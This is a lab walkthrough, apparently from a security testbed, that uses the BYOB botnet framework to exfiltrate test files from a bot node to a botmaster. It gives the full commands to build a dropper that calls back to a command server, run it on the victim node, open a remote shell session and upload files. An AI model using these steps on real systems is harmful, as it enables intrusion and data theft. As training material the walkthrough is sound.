## Exfiltration Attack
The data is exfiltrated from bot nodes (`b1` in our case) to botmaster (`botmaster` in our case).

### Connection with client

We will use the `botmaster` node to generate a client. The client will use a basic module built into it.

SSH to the botmaster node from your XDC
```shell
ssh botmaster
```

```shell
cd /opt/byob/byob.git/byob
python3 client.py --freeze botmaster.infra 1337 exfiltrate
```
The output should look like this:

```shell


88                                  88
88                                  88
88                                  88
88,dPPYba,  8b       d8  ,adPPYba,  88,dPPYba,
88P'    "8a `8b     d8' a8"     "8a 88P'    "8a
88       d8  `8b   d8'  8b       d8 88       d8
88b,   ,a8"   `8b,d8'   "8a,   ,a8" 88b,   ,a8"
8Y"Ybbd8"'      Y88'     `"YbbdP"'  8Y"Ybbd8"'
                d8'
               d8'


[>] Modules
        Adding modules...  -[-] can't add module: 'exfiltrate' (does not exist)
(4 modules added to client)

[>] Imports
        Adding imports...-(32 imports from 4 modules)

[>] Payload
        Uploading payload...  -(hosting payload at: http://botmaster.infra:1338/clients/payloads/jIJ.py)

[>] Stager
        Uploading stager... -(hosting stager at: http://botmaster.infra:1338/clients/stagers/jIJ.py)

[>] Dropper
        Writing dropper...  (355 bytes written to /modules/clients/droppers/byob_jIJ.py)
        Compiling executable...
91 INFO: PyInstaller: 6.4.0, contrib hooks: 2024.1
91 INFO: Python: 3.9.2
.
.
.
19652 INFO: Appending PKG archive to custom ELF section in EXE
19714 INFO: Building EXE from EXE-00.toc completed successfully.
(22,541,192 bytes saved to file: /opt/byob/byob.git/dist/jIJ)
```

We now scp this module to our home directory on the client (for example, `b1`):
```shell
scp dist/jIJ b1.infra:
```

Lastly, startup the server
```shell
python3 -u server.py
```
The server should start and should start a prompt as follows:

```shell
88                                  88
88                                  88
88                                  88
88,dPPYba,  8b       d8  ,adPPYba,  88,dPPYba,
88P'    "8a `8b     d8' a8"     "8a 88P'    "8a
88       d8  `8b   d8'  8b       d8 88       d8
88b,   ,a8"   `8b,d8'   "8a,   ,a8" 88b,   ,a8"
8Y"Ybbd8"'      Y88'     `"YbbdP"'  8Y"Ybbd8"'
                d8'
               d8'


[?]  Hint: show usage information with the 'help' command

[rishitsaiya @ /opt/byob/byob]>
```

Parallely, SSH to the b1 node from your XDC through different terminal
```shell
ssh b1
```
Execute the payload from here
```shell
./jIJ
```

At this point, the server should display a message like:
```shell
[+] Connection: 172.30.0.11
    Session: 0
    Started: Wed Nov  8 20:34:50 2023
```

Connect with the bot node using
```shell
shell 0
```
You can verify the socket connection by typing `ls` at prompt in server to check.

#### Test Files Creation
For demo purposes I have created `test.txt`, `test_dir/` on `b1` node.

```shell
rishitsaiya@b1:~$ ls
jIJ test_dir test.txt
rishitsaiya@b1:~$ cd test_dir/
rishitsaiya@b1:~/test_dir$ ls
test.txt
rishitsaiya@b1:~/test_dir$ cat test.txt 
This is a test file.
```

#### Exfiltrate from b1 to botmaster
On botmaster node where the server is running, type the command:

```shell
[ 0 @ /home/rishitsaiya ]>upload test.txt

Upload complete

[ 0 @ /home/rishitsaiya ]>upload test_dir

Upload complete
```

It should look like this.

#### Access Exfiltrated data at botmaster
At the botmaster node, check the directory called `output`. There should be files with encoded names in `output` directory.

```shell
rishitsaiya@botmaster:/opt/byob/byob$ cd output/
rishitsaiya@botmaster:/opt/byob/byob/output$ ls
8ky..txt  rha..zip
rishitsaiya@botmaster:/opt/byob/byob/output$ cat 8ky..txt 
This is a test file.
rishitsaiya@botmaster:/opt/byob/byob/output$ unzip rha..zip 
Archive:  rha..zip
 extracting: test_dir/test.txt       
rishitsaiya@botmaster:/opt/byob/byob/output$ ls
8ky..txt  rha..zip  test_dir
rishitsaiya@botmaster:/opt/byob/byob/output$ cd test_dir/
rishitsaiya@botmaster:/opt/byob/byob/output/test_dir$ cat test.txt 
This is a test file.
```

The file `test.txt` becomes `8ky..txt` when exfiltrated. There can be other names too, but the content of the file and file formats remains uncorrupted. The directory `test_dir` when exfiltrated from the `b1` to `botmaster` is programmed to get zipped and exfiltrated and hence it becomes `rha..zip`.
